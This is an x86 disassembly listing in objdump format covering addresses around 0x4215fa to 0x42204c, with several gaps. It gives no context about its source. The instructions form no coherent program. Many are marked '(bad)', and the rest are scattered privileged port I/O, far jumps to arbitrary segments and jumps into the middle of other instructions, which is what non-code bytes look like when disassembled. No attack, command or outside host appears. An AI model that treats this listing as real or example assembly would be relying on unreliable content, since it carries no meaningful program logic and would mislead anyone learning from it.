  4215fa:	inc    esi
  4215fb:	mov    eax,ds:0x49dc1509
  421600:	sub    DWORD PTR [ecx+0x71],edi
  421603:	bound  esp,QWORD PTR [edi+edi*4-0x695ac301]
  42160a:	dec    ebp
  42160b:	push   ecx
  42160c:	mov    WORD PTR [ebx-0x35],?
  42160f:	pop    ds
  421610:	xchg   esp,eax
  421611:	div    BYTE PTR [edi+0x59f624be]
  421617:	xor    esp,DWORD PTR [eax+0xe50eca2]
  42161d:	jle    0x42160a
  42161f:	daa    
  421620:	xchg   esi,eax
  421621:	sub    DWORD PTR [esp+ebx*4+0x1dc320d0],eax
  421628:	jle    0x42161f
  42162a:	cmp    al,0x6f
  42162c:	and    al,0x14
  42162e:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421630:	push   es
  421631:	cdq    
  421632:	retf   0x681a
	...
  421695:	add    BYTE PTR [ebx-0x105512d4],ch
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	or     al,0xa2
  4216a4:	add    al,0x13
  4216a6:	frstor [edx+0x1]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    BYTE PTR [edx],bh
  4216af:	test   BYTE PTR [ebx],bh
  4216b1:	iret   
  4216b2:	mov    fs:0x565bd4f6,eax
  4216b8:	in     al,0xb9
  4216ba:	inc    eax
  4216bb:	ins    BYTE PTR es:[edi],dx
  4216bc:	ja     0x42172f
  4216be:	in     al,dx
  4216bf:	daa    
  4216c0:	adc    al,0xfb
  4216c2:	jne    0x4216c1
  4216c4:	(bad)  
  4216c6:	add    ch,dh
  4216c8:	popa   
  4216c9:	lds    ebp,FWORD PTR [edx+0x636c18]
  4216cf:	push   cx
  4216d1:	xchg   ebx,eax
  4216d2:	add    cl,BYTE PTR [edx-0x6b]
  4216d5:	dec    ebx
  4216d6:	add    BYTE PTR [ebx+0x2f6c9c10],dl
  4216dc:	or     ecx,0x8ebc3a0f
  4216e2:	inc    edi
  4216e3:	push   ebx
  4216e4:	mov    ds:0x4461a75c,al
  4216e9:	pop    eax
  4216ea:	aad    0x54
  4216ec:	jmp    0xb2c2:0x8212d085
  4216f3:	and    BYTE PTR [esi+0x652d0b99],bh
  4216f9:	neg    DWORD PTR [edi]
  4216fb:	ja     0x4216c5
  4216fd:	loope  0x421730
  4216ff:	fdivr  DWORD PTR [ebx+0x3b508c21]
  421705:	xchg   esp,eax
  421706:	add    DWORD PTR [edx+esi*1],edi
  421709:	xor    eax,0xbd284ca1
  42170e:	dec    esp
  42170f:	cmp    eax,DWORD PTR [edx+0x6a2b342f]
  421715:	cs (bad) 
  421717:	rcl    DWORD PTR [edx-0x191d2741],cl
  42171d:	jecxz  0x42173e
  42171f:	pop    es
  421720:	jmp    0x421784
  421722:	xchg   edx,eax
  421723:	sub    ah,0x29
  421726:	mov    ds:0x8d9f9318,al
  42172b:	push   ss
  42172c:	int3   
  42172d:	jo     0x42176f
  42172f:	sub    eax,0x6c5f3f7e
  421734:	ror    BYTE PTR [esi-0x3e8e8443],1
  42173a:	pop    ss
  42173b:	ins    BYTE PTR es:[edi],dx
  42173c:	ins    BYTE PTR es:[edi],dx
  42173d:	(bad)  
  42173f:	fist   WORD PTR [ecx-0x71]
  421742:	and    ecx,edi
  421744:	fs and eax,0x28fa3efa
  42174a:	inc    edi
  42174b:	int    0x8
  42174d:	nop
  42174e:	pushf  
  42174f:	pusha  
  421750:	adc    al,0xc2
  421752:	push   ebx
  421753:	rcr    DWORD PTR [edx+0x23],1
  421756:	(bad)  
  421757:	dec    esi
  421758:	xchg   ebx,eax
  421759:	loop   0x421712
  42175b:	inc    edi
  42175c:	mov    dl,0x16
  42175e:	push   es
  42175f:	test   ch,dl
  421761:	adc    ebp,DWORD PTR [ecx+0x53662bdd]
  421767:	hlt    
  421768:	dec    esi
  421769:	(bad)  
  42176a:	adc    ah,BYTE PTR [eax]
  42176c:	pop    edx
  42176d:	add    ah,ah
  42176f:	(bad)  
  421770:	repnz mov esp,0x16b7c80e
  421776:	scas   al,BYTE PTR es:[edi]
  421777:	and    dl,al
  421779:	push   edx
  42177a:	xor    al,0x45
  42177c:	or     bh,dl
  42177e:	mov    dh,0x6
  421780:	mov    dh,0x40
  421782:	mov    al,0xf6
  421784:	add    BYTE PTR [edx],ch
  421786:	dec    eax
  421787:	data16 and cl,ah
  42178a:	or     ecx,DWORD PTR [edx+0x52fbd6ed]
  421790:	add    eax,0xe9beaf3c
  421795:	and    DWORD PTR ds:[esp+ebp*4+0x11434cdb],eax
  42179d:	mov    cl,0x6d
  42179f:	xor    al,0xb6
  4217a1:	out    dx,al
  4217a2:	fsubr  st,st(1)
  4217a4:	xchg   edi,eax
  4217a5:	xor    al,0xee
  4217a7:	call   0xfaae:0x32c76b61
  4217ae:	cmp    ebx,edi
  4217b0:	adc    eax,0x1a75e101
	...
  421815:	add    cl,dl
  421817:	mov    al,ds:0xf9f9e0b9
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	or     dh,dh
  421824:	sub    cl,dl
  421826:	in     al,0x63
  421828:	add    DWORD PTR [eax],eax
  42182a:	pop    es
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    bh,ch
  42182f:	jp     0x4217f7
  421831:	jno    0x4217ef
  421833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421834:	mov    ah,BYTE PTR [edx-0x4634642e]
  42183a:	addr16 fwait
  42183c:	sbb    al,0x4f
  42183e:	jge    0x42181a
  421840:	add    DWORD PTR [edx+0xbe9b68d],0x4c
  421847:	add    DWORD PTR [edi+edi*4],esi
  42184a:	sub    ebp,DWORD PTR [ebx-0x49]
  42184d:	pop    eax
  42184e:	or     edx,DWORD PTR [ebp+edi*1-0x419da6aa]
  421855:	ffree  st(6)
  421857:	das    
  421858:	xchg   BYTE PTR [ebx],cl
  42185a:	dec    ecx
  42185b:	jp     0x42187a
  42185d:	(bad)  
  42185e:	jmp    0x27629a9c
  421863:	push   ebx
  421864:	pop    ebx
  421865:	gs repnz adc eax,0xfa3fbf89
  42186c:	sahf   
  42186d:	mov    edi,0x481a5197
  421872:	ds (bad) 
  421874:	jl     0x42188e
  421876:	sbb    dh,BYTE PTR [ebx-0x1d]
  421879:	hlt    
  42187a:	xor    al,0xf4
  42187c:	or     al,dh
  42187e:	push   ecx
  42187f:	cmp    eax,0xb80c6e1f
  421884:	xchg   edi,eax
  421885:	jbe    0x421859
  421887:	aam    0x35
  421889:	into   
  42188a:	data16 into 
  42188c:	rcr    DWORD PTR [eax+0x32639455],0x6a
  421893:	mov    bh,0x7a
  421895:	or     cl,BYTE PTR [ebp+ecx*2-0x187b87d9]
  42189c:	cli    
  42189d:	loopne 0x4218a0
  42189f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218a0:	xor    al,0x54
  4218a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218a3:	jmp    0x6fa:0x78d83e00
  4218aa:	push   edi
  4218ab:	mov    eax,0x98cb4e55
  4218b0:	mov    eax,0x2528d324
  4218b5:	(bad)  
  4218b6:	add    ecx,DWORD PTR [eax+0x2ce7be9b]
  4218bc:	out    0xbb,eax
  4218be:	mov    al,0x57
  4218c0:	aam    0xed
  4218c2:	mov    al,0x65
  4218c4:	add    dl,dl
  4218c6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4218c8:	dec    eax
  4218c9:	mov    ebx,0x5061a546
  4218ce:	lahf   
  4218cf:	inc    ebp
  4218d0:	and    BYTE PTR [edx-0x6e5cfa0b],ch
  4218d6:	sahf   
  4218d7:	jle    0x42189e
  4218d9:	jns    0x4218e2
  4218db:	cmp    al,0x11
  4218dd:	mov    al,cl
  4218df:	call   DWORD PTR [ebp-0x374e08dc]
  4218e5:	scas   al,BYTE PTR es:[edi]
  4218e6:	jecxz  0x421911
  4218e8:	jo     0x4218eb
  4218ea:	das    
  4218eb:	add    eax,0x6ccf5363
  4218f0:	test   DWORD PTR [ebp-0x4],ecx
  4218f3:	mov    esi,0xdd3300a7
  4218f8:	sbb    al,0x67
  4218fa:	or     ecx,DWORD PTR [edx]
  4218fc:	dec    edi
  4218fd:	je     0x421946
  4218ff:	mov    edx,0xee92919c
  421904:	jge    0x4218e4
  421906:	sbb    eax,0x255b199c
  42190b:	mov    bl,0x63
  42190d:	ret    0x574a
  421910:	xor    BYTE PTR [eax+0x1d],dh
  421913:	sub    BYTE PTR [edi+0x1df76bbd],ch
  421919:	dec    eax
  42191a:	jae    0x421995
  42191c:	sbb    eax,0x8219c8c
  421921:	ss cmp al,0x19
  421924:	or     eax,DWORD PTR [eax]
  421926:	sbb    esp,DWORD PTR [ebx+0x26f9fe5c]
  42192c:	rcr    BYTE PTR [esi-0x47],0x62
  421930:	sub    ch,cl
  421932:	inc    esi
  421933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421934:	cwde   
	...
  421995:	add    dh,bh
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx-0x600ac857],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    cl,bl
  4219af:	les    eax,FWORD PTR [esp+esi*1-0x14]
  4219b3:	fwait
  4219b4:	pop    es
  4219b5:	lods   eax,DWORD PTR ds:[esi]
  4219b6:	call   0xe2b:0xd2eb08b8
  4219bd:	and    DWORD PTR ds:0xb328c89d,ecx
  4219c3:	in     al,dx
  4219c4:	out    0xa0,eax
  4219c6:	xor    ch,BYTE PTR [eax]
  4219c8:	pop    ebp
  4219c9:	aad    0x27
  4219cb:	test   al,0x15
  4219cd:	jge    0x42197f
  4219cf:	fiadd  DWORD PTR [ebx-0x78]
  4219d2:	gs scas eax,DWORD PTR es:[edi]
  4219d4:	pushf  
  4219d5:	(bad)
  4219d8:	inc    ebp
  4219d9:	xchg   ebx,eax
  4219da:	call   0x56bd95b
  4219df:	cmp    ecx,ebx
  4219e1:	lods   eax,DWORD PTR ds:[esi]
  4219e2:	xor    al,BYTE PTR [edx-0x67521f37]
  4219e8:	cmp    ah,bl
  4219ea:	into   
  4219eb:	push   edx
  4219ec:	pop    eax
  4219ed:	iret   
  4219ee:	cmp    al,0x72
  4219f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219f1:	es sti 
  4219f3:	push   ds
  4219f4:	fisub  WORD PTR [esi]
  4219f6:	add    DWORD PTR [esi],esp
  4219f8:	mov    BYTE PTR [ebx+0x30566004],0x72
  4219ff:	rcl    dl,0x7e
  421a02:	inc    ecx
  421a03:	and    BYTE PTR [esi-0x6f2f328f],ah
  421a09:	dec    esi
  421a0a:	leave  
  421a0b:	scas   eax,DWORD PTR es:[edi]
  421a0c:	xchg   BYTE PTR [esi-0x7736b78a],cl
  421a12:	call   FWORD PTR [esi]
  421a14:	ins    DWORD PTR es:[edi],dx
  421a15:	dec    esp
  421a16:	std    
  421a17:	ror    BYTE PTR [ebp-0x1c],0x5d
  421a1b:	xor    DWORD PTR [ebx+0x79b31147],edi
  421a21:	hlt    
  421a22:	pushf  
  421a23:	mov    WORD PTR [ebp-0x7c],ds
  421a26:	aas    
  421a27:	xchg   edx,eax
  421a28:	xor    al,0x32
  421a2a:	and    DWORD PTR [ecx-0x38644a14],edx
  421a30:	xor    edx,DWORD PTR [ecx-0x156ff99e]
  421a36:	lock (bad) 
  421a38:	adc    eax,0xfed5f113
  421a3d:	push   0x8dc5657b
  421a42:	out    dx,eax
  421a43:	cdq    
  421a44:	clc    
  421a45:	outs   dx,DWORD PTR ds:[esi]
  421a46:	and    al,0x28
  421a48:	push   ss
  421a49:	pop    ebp
  421a4a:	mov    edx,0x900ae2a7
  421a4f:	fucomi st,st(7)
  421a51:	dec    ebp
  421a52:	aam    0x80
  421a54:	jmp    0x60d:0x9788049a
  421a5b:	lock lock dec ebp
  421a5e:	sahf   
  421a5f:	mov    bx,0xeffe
  421a63:	jl     0x421acc
  421a65:	xchg   ecx,eax
  421a66:	(bad)  [esi]
  421a68:	fst    QWORD PTR [ebp+0x434a03a0]
  421a6e:	repnz ins BYTE PTR es:[edi],dx
  421a70:	inc    esp
  421a71:	leave  
  421a72:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  421a74:	out    0x68,al
  421a76:	jge    0x421a55
  421a78:	inc    ebp
  421a79:	jae    0x421a6e
  421a7b:	sti    
  421a7c:	cmp    ecx,DWORD PTR [ebp+0x57]
  421a7f:	push   ds
  421a80:	cmp    eax,DWORD PTR [ebx-0x5e439199]
  421a86:	dec    eax
  421a87:	popa   
  421a88:	sahf   
  421a89:	out    dx,al
  421a8a:	aad    0x66
  421a8c:	adc    dl,ch
  421a8e:	add    cl,dl
  421a90:	or     al,0x40
  421a92:	sbb    DWORD PTR [ebp+eiz*2-0x38041505],0x6f
  421a9a:	xchg   edi,eax
  421a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a9c:	dec    edx
  421a9d:	xor    al,0x9a
  421a9f:	scas   eax,DWORD PTR es:[edi]
  421aa0:	sub    BYTE PTR [esi-0x56c71a8d],bh
  421aa6:	push   ecx
  421aa7:	jmp    0x421a9f
  421aa9:	lea    esi,[edx+edx*4-0x23]
  421aad:	icebp  
  421aae:	lods   al,BYTE PTR ds:[esi]
  421aaf:	pop    ds
  421ab0:	enter  0x473d,0xbe
  421ab4:	or     eax,DWORD PTR [eax]
	...
  421b16:	push   ss
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx+0x4d5c74ca],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    BYTE PTR [ebx*2-0x2795caa],bh
  421b34:	lds    eax,FWORD PTR [ebx+0x47]
  421b37:	xchg   edx,eax
  421b38:	repnz pop ds
  421b3a:	xchg   DWORD PTR [ebx-0x743667cc],ebp
  421b40:	and    ecx,ebp
  421b42:	xlat   BYTE PTR ds:[ebx]
  421b43:	lahf   
  421b44:	and    BYTE PTR [eax-0x16f61304],ah
  421b4a:	outs   dx,DWORD PTR ds:[esi]
  421b4b:	in     al,dx
  421b4c:	mov    eax,0xda32ae6e
  421b51:	fnstsw WORD PTR [eax]
  421b53:	add    al,0x39
  421b55:	fcom   DWORD PTR [ecx+0x4a]
  421b58:	out    dx,eax
  421b59:	add    BYTE PTR [esi+0x98f00be],0xdf
  421b60:	xor    al,0xa9
  421b62:	jo     0x421b67
  421b64:	mov    ah,0xd0
  421b66:	pop    ds
  421b67:	nop
  421b68:	mov    BYTE PTR [ecx-0x65],al
  421b6b:	ss loopne 0x421af6
  421b6e:	rcl    DWORD PTR [ecx],1
  421b70:	ins    BYTE PTR es:[edi],dx
  421b71:	and    al,0x37
  421b73:	jns    0x421baf
  421b75:	inc    edi
  421b76:	dec    ebx
  421b77:	imul   eax,DWORD PTR [esi],0xe7e89fef
  421b7d:	loope  0x421bfa
  421b7f:	or     DWORD PTR [ebp+eiz*4-0x7efa48dd],0xba8af2d5
  421b8a:	fs jge 0x421bc2
  421b8d:	lahf   
  421b8e:	mov    BYTE PTR [eax],dl
  421b90:	cmc    
  421b91:	jle    0x421c07
  421b93:	or     bl,BYTE PTR [edx-0x68]
  421b96:	mov    ah,0x51
  421b98:	xor    BYTE PTR [ebx+0x3b],dh
  421b9b:	dec    edx
  421b9c:	js     0x421b5e
  421b9e:	and    DWORD PTR [eax-0x57fc4127],ebx
  421ba4:	sub    eax,0x483e8e7a
  421ba9:	or     eax,edx
  421bab:	shr    BYTE PTR [esi+ebp*8+0x34e79793],1
  421bb2:	sahf   
  421bb3:	pop    ss
  421bb4:	sbb    BYTE PTR [eax],dl
  421bb6:	arpl   WORD PTR [edx+0x12fd4a4a],si
  421bbc:	dec    edi
  421bbd:	pushf  
  421bbe:	loop   0x421c1b
  421bc0:	push   ecx
  421bc1:	pop    ecx
  421bc2:	or     DWORD PTR [edx],ecx
  421bc4:	repz dec ebp
  421bc6:	xlat   BYTE PTR ds:[ebx]
  421bc8:	push   edi
  421bc9:	inc    ebx
  421bca:	fcomp  DWORD PTR [esi+0x2d]
  421bcd:	cli    
  421bce:	dec    esp
  421bcf:	loop   0x421c20
  421bd1:	mov    ebx,0x8127b653
  421bd6:	fs mov bh,0xab
  421bd9:	ret    0x4bd
  421bdc:	in     eax,0x99
  421bde:	pop    es
  421bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421be0:	xchg   DWORD PTR [ebx+0x68b7b006],eax
  421be6:	pop    eax
  421be7:	das    
  421be8:	adc    DWORD PTR [eax+0x54f74331],ebx
  421bee:	dec    bl
  421bf0:	sbb    eax,0x788efe4e
  421bf5:	mov    bh,0x60
  421bf7:	xlat   BYTE PTR ds:[ebx]
  421bf8:	fild   DWORD PTR [eax-0x58]
  421bfb:	clc    
  421bfc:	out    0xa4,eax
  421bfe:	lahf   
  421bff:	cmp    BYTE PTR [edi-0x24f757fd],ch
  421c05:	adc    al,0x38
  421c07:	adc    dl,BYTE PTR [ebp-0x65]
  421c0a:	sub    ebx,0x6c2a0bc1
  421c10:	dec    edx
  421c11:	es aad 0xd7
  421c14:	mov    bl,0x85
  421c16:	xchg   ebx,eax
  421c17:	and    al,0x19
  421c19:	leave  
  421c1a:	mov    ecx,0x94ef4863
  421c1f:	loop   0x421ba6
  421c21:	xchg   edx,eax
  421c22:	out    dx,al
  421c23:	fisttp WORD PTR [ecx-0xe]
  421c26:	scas   eax,DWORD PTR es:[edi]
  421c27:	into   
  421c28:	mov    ebx,0x219e3045
  421c2d:	scas   eax,DWORD PTR es:[edi]
  421c2e:	xor    cl,BYTE PTR [esi+esi*1+0x4d]
  421c32:	push   esi
  421c33:	popa   
  421c34:	push   ebp
	...
  421c95:	add    BYTE PTR [eax-0x1a4a95],dh
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp-0x1bae0be7],0x15
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR [edx-0x128df4de],al
  421cb3:	sahf   
  421cb4:	inc    ebx
  421cb5:	outs   dx,BYTE PTR ds:[esi]
  421cb6:	xor    al,0x56
  421cb8:	xchg   esi,eax
  421cb9:	loop   0x421d07
  421cbb:	out    dx,al
  421cbc:	hlt    
  421cbd:	ins    BYTE PTR es:[edi],dx
  421cbe:	pop    edx
  421cbf:	stos   DWORD PTR es:[edi],eax
  421cc0:	call   0x735:0xaf13c4d0
  421cc7:	mov    dl,0x2d
  421cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cca:	jg     0x421c79
  421ccc:	and    edx,ebx
  421cce:	int3   
  421ccf:	fucom  st(0)
  421cd1:	hlt    
  421cd2:	push   edi
  421cd3:	mov    ch,0x25
  421cd5:	ror    bl,0xaa
  421cd8:	fisubr DWORD PTR [ebx]
  421cda:	push   ecx
  421cdb:	rcl    DWORD PTR [ecx],cl
  421cdd:	fst    QWORD PTR [ebx-0x2f]
  421ce0:	xchg   edi,eax
  421ce1:	sub    dh,BYTE PTR [edi+0x2a]
  421ce4:	dec    esp
  421ce5:	xor    edi,DWORD PTR [esi+edi*8-0x5d]
  421ce9:	inc    esp
  421cea:	(bad)  
  421ceb:	jae    0x421ccb
  421ced:	fcmovu st,st(4)
  421cef:	jnp    0x421d38
  421cf1:	(bad)  
  421cf2:	jmp    0x421c95
  421cf4:	inc    edx
  421cf5:	and    al,0x97
  421cf7:	xor    ah,ah
  421cf9:	mov    cs,WORD PTR [edi+0x74]
  421cfc:	shr    BYTE PTR [esi],cl
  421cfe:	nop    DWORD PTR [edx+0x47]
  421d02:	sbb    BYTE PTR [ecx+0xb],0xc2
  421d06:	sbb    DWORD PTR [eax],eax
  421d08:	retf   0xfb36
  421d0b:	call   DWORD PTR [ebx+0x4b344626]
  421d11:	mov    ebp,0xa9ebcb27
  421d16:	sub    bh,bh
  421d18:	mov    ch,0xec
  421d1a:	clc    
  421d1b:	push   ds
  421d1c:	ror    DWORD PTR [eax+ecx*8+0x16],0xd
  421d21:	xchg   esp,eax
  421d22:	and    al,0x1b
  421d24:	loop   0x421d5e
  421d26:	(bad)  
  421d27:	outs   dx,BYTE PTR ds:[esi]
  421d28:	pop    esi
  421d29:	enter  0x6030,0x11
  421d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d2e:	sub    edx,DWORD PTR [ebx+0x17]
  421d31:	xlat   BYTE PTR ds:[ebx]
  421d32:	cs inc esi
  421d34:	sbb    esi,DWORD PTR [ebx+0x66b5b15]
  421d3a:	dec    edi
  421d3b:	mov    eax,0xef2953ac
  421d40:	hlt    
  421d41:	push   0xfffffff1
  421d43:	fld    TBYTE PTR [esi]
  421d45:	mov    esi,0x22ad1c22
  421d4a:	adc    cl,bh
  421d4c:	mov    DWORD PTR [ebp+0x27e0368d],ebx
  421d52:	mov    ah,0x99
  421d54:	jp     0x421d50
  421d56:	sbb    DWORD PTR [edi+0xb7afa1a],esp
  421d5c:	dec    esi
  421d5d:	mov    al,0x5e
  421d5f:	gs sub al,0x32
  421d62:	lods   eax,DWORD PTR ds:[esi]
  421d63:	push   0x79
  421d65:	inc    DWORD PTR [eax+0x5f]
  421d68:	sbb    al,cl
  421d6a:	push   es
  421d6b:	inc    edi
  421d6c:	xor    eax,0x36a4c78c
  421d71:	xchg   al,ah
  421d73:	gs jne 0x421dcd
  421d76:	test   BYTE PTR [esi+0x32b48774],dl
  421d7c:	adc    eax,0x5e407911
  421d81:	cdq    
  421d82:	cli    
  421d83:	push   edi
  421d84:	pop    ecx
  421d85:	sbb    esi,DWORD PTR [esi]
  421d87:	aam    0xf0
  421d89:	loopne 0x421d18
  421d8b:	fs dec esp
  421d8d:	jmp    0x610e1e09
  421d92:	mov    esp,0x433e1f30
  421d97:	cdq    
  421d98:	cmp    DWORD PTR [esi+edx*2+0x61],ebx
  421d9c:	add    DWORD PTR [edx],ebx
  421d9e:	cmp    eax,0x7c33da6e
  421da3:	sbb    eax,0xb58a0611
  421da8:	jo     0x421db8
  421daa:	(bad)  
  421dab:	out    dx,eax
  421dac:	(bad)  [ecx]
  421dae:	(bad)  
  421daf:	xor    cl,BYTE PTR [eax+0x1b022b3f]
	...
  421e15:	add    bh,cl
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    bh,ah
  421e23:	xchg   ebx,eax
  421e24:	test   BYTE PTR [edi+0x0],al
  421e27:	push   0x1070001
  421e2c:	add    BYTE PTR [eax],al
  421e2e:	push   ebp
  421e2f:	imul   ebp,DWORD PTR [ebx+edx*8+0x1d009bca],0xe5f025bf
  421e3a:	adc    esp,DWORD PTR [edx-0x2b]
  421e3d:	not    DWORD PTR ds:0xccbf38e1
  421e43:	aam    0x74
  421e45:	or     eax,0x9a9c1297
  421e4a:	dec    eax
  421e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e4c:	outs   dx,DWORD PTR ds:[esi]
  421e4d:	sub    esi,DWORD PTR [ebx-0x7b4c3b89]
  421e53:	out    0x45,al
  421e55:	push   eax
  421e56:	cld    
  421e57:	aam    0xcb
  421e59:	mov    ebx,0xd08ab4f0
  421e5e:	sar    DWORD PTR [ecx],cl
  421e60:	popf   
  421e61:	mov    esp,0x7d747644
  421e66:	aas    
  421e67:	xchg   ebp,eax
  421e68:	jge    0x421e2c
  421e6a:	test   eax,0x362af3ab
  421e6f:	loop   0x421eef
  421e71:	cwde   
  421e72:	and    BYTE PTR [edi+0x260bc1ed],dl
  421e78:	ficom  DWORD PTR [ecx-0x49]
  421e7b:	or     eax,edi
  421e7d:	pop    ebp
  421e7e:	lods   eax,DWORD PTR ds:[esi]
  421e7f:	pop    edi
  421e80:	ret    
  421e81:	loop   0x421eb8
  421e83:	xor    edx,eax
  421e85:	jb     0x421eb9
  421e87:	test   eax,0x10c7c101
  421e8c:	out    dx,al
  421e8d:	xor    DWORD PTR [ecx],eax
  421e8f:	or     eax,0x5bd04577
  421e94:	push   ebp
  421e95:	inc    edi
  421e96:	jmp    0x421eca
  421e98:	push   0x62eb4b3b
  421e9d:	adc    DWORD PTR [edx],edi
  421e9f:	mov    cl,0xfb
  421ea1:	js     0x421e39
  421ea3:	xlat   BYTE PTR ds:[ebx]
  421ea4:	push   edx
  421ea5:	pop    ss
  421ea6:	jb     0x421e8a
  421ea8:	sar    DWORD PTR [eax],0xe5
  421eab:	shr    edx,1
  421ead:	iret   
  421eae:	mov    ebp,0x53cae4b4
  421eb3:	jp     0x421e81
  421eb5:	fcomp  QWORD PTR [ebx-0x56]
  421eb8:	cld    
  421eb9:	sbb    ah,BYTE PTR [edx+0x64e5fd58]
  421ebf:	mov    fs,ecx
  421ec1:	fucomp st(5)
  421ec3:	mov    al,cl
  421ec5:	and    BYTE PTR [edi-0x4b],ah
  421ec8:	push   ebp
  421ec9:	sahf   
  421eca:	neg    DWORD PTR [edi-0x3d090129]
  421ed0:	xlat   BYTE PTR ds:[ebx]
  421ed1:	pop    ebp
  421ed2:	arpl   WORD PTR [ecx+0x52225c96],bp
  421ed8:	outs   dx,BYTE PTR ds:[esi]
  421ed9:	pop    es
  421eda:	pop    ebx
  421edb:	add    bl,BYTE PTR [esi+0x14cb78a0]
  421ee1:	push   0x8dbea037
  421ee6:	arpl   WORD PTR [esi-0x6fd220a9],ax
  421eec:	cmp    al,0x82
  421eee:	push   edx
  421eef:	pop    ds
  421ef0:	in     al,dx
  421ef1:	jnp    0x421eab
  421ef3:	cmp    ch,bl
  421ef5:	mov    cl,0x88
  421ef7:	mov    esi,0xc4deb576
  421efc:	add    al,BYTE PTR [ebp+0x9]
  421eff:	dec    edx
  421f00:	out    dx,eax
  421f01:	sbb    ecx,DWORD PTR [ecx]
  421f03:	outs   dx,BYTE PTR ds:[esi]
  421f04:	jg     0x421f1f
  421f06:	jb     0x421f76
  421f08:	or     eax,0x19870fa0
  421f0d:	les    edi,FWORD PTR [ebx-0x51]
  421f10:	(bad)  
  421f11:	push   eax
  421f12:	or     cl,dl
  421f14:	enter  0xbb63,0x17
  421f18:	sub    BYTE PTR [esi-0xa9865e5],0xf5
  421f1f:	mov    dl,0xc6
  421f21:	pop    edi
  421f22:	scas   al,BYTE PTR es:[edi]
  421f23:	imul   ecx,eax,0xb3533b04
  421f29:	loopne 0x421f50
  421f2b:	adc    bl,dh
  421f2d:	cld    
  421f2e:	adc    ebp,DWORD PTR [edx-0x31]
  421f31:	jo     0x421f9e
  421f33:	int    0x7
	...
  421f95:	add    BYTE PTR [ebx+0x6],ch
  421f98:	(bad)  
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0xd852af78
  421fa4:	(bad)  
  421fa5:	cmp    DWORD PTR [edi],eax
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [edi],ah
  421faf:	xchg   ebp,eax
  421fb0:	pop    ds
  421fb1:	sub    eax,0x1227f953
  421fb6:	bound  ebp,QWORD PTR [ecx+0x730881a0]
  421fbc:	mov    ecx,0xb735ed49
  421fc1:	push   esp
  421fc2:	sar    BYTE PTR gs:[ebx],cl
  421fc5:	cli    
  421fc6:	pop    ebx
  421fc7:	je     0x421fd5
  421fc9:	lods   al,BYTE PTR ds:[esi]
  421fca:	cmp    ch,cl
  421fcc:	xchg   edx,eax
  421fcd:	mov    dl,0xfe
  421fcf:	repnz adc BYTE PTR [edi],0xb2
  421fd3:	mov    cl,0xf7
  421fd5:	scas   eax,DWORD PTR es:[edi]
  421fd6:	pop    ecx
  421fd7:	loopne 0x42202c
  421fd9:	pop    ds
  421fda:	in     al,0x3c
  421fdc:	gs ret 0x211a
  421fe0:	stos   BYTE PTR es:[edi],al
  421fe1:	sar    edx,0xd1
  421fe4:	ss pop edi
  421fe6:	aaa    
  421fe7:	dec    ecx
  421fe8:	and    ch,BYTE PTR [ecx]
  421fea:	add    BYTE PTR [eax],0x2
  421fed:	or     al,0x7c
  421fef:	dec    ebx
  421ff0:	mov    esp,0xa2f53729
  421ff5:	(bad)  
  421ff6:	enter  0x90e5,0x49
  421ffa:	jne    0x421f85
  421ffc:	mov    dh,0x46
  421ffe:	mov    dh,0x8
  422000:	and    eax,DWORD PTR [eax]
  422002:	(bad)  [edi+0x64]
  422005:	adc    al,0xec
  422007:	fistp  QWORD PTR [eax+0x76]
  42200a:	or     eax,0x24e226c8
  42200f:	pushf  
  422010:	and    DWORD PTR [edi+0x1a72ec0d],esp
  422016:	outs   dx,DWORD PTR ds:[esi]
  422017:	fdivr  QWORD PTR [edx+0x13eecedc]
  42201d:	out    0x84,eax
  42201f:	fidivr DWORD PTR [ecx+0x37]
  422022:	int    0xdc
  422024:	cs pop ebp
  422026:	in     eax,0xc2
  422028:	pop    esp
  422029:	add    eax,0xc8b392e6
  42202e:	push   esp
  42202f:	loopne 0x421ffd
  422031:	test   eax,0x2cc7af1a
  422036:	sub    ebp,eax
  422038:	dec    edx
  422039:	shl    BYTE PTR [edi],cl
  42203b:	repnz cmp DWORD PTR [ebp-0x72],ebx
  42203f:	jmp    FWORD PTR [eax-0x263bcdc0]
  422045:	popf   
  422046:	les    edx,FWORD PTR [ebx-0x3e661ca]
  42204c:	jae    0x42205e
